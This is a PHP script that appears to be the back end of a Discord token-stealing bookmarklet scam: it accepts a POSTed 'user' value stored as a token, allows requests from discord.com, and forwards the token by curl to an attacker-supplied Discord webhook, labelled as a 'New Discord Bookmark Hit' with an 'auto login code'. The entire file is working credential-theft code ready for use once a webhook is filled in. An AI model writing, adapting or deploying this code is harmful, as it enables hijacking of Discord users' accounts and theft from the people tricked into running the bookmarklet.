<?php
header("Access-Control-Allow-Origin: https://discord.com");
if($_POST['user']){
  $token = $_POST['user'];
  $webhookurl = "YOURWEBHOOK";
$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    "content" => "@everyone **New Discord Bookmark Hit!**",
    "username" => "bookmark",
    "tts" => false,
    "embeds" => [
        [
            "title" => "+1 New Result Account",
            "type" => "rich",
            "description" => "```$token```",
            "timestamp" => $timestamp,
            "color" => hexdec( "000000" ),
            "author" => [
                "name" => "Copy auto login code",
                "url" => "https://mee6.xyz"
            ],
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
}
?>
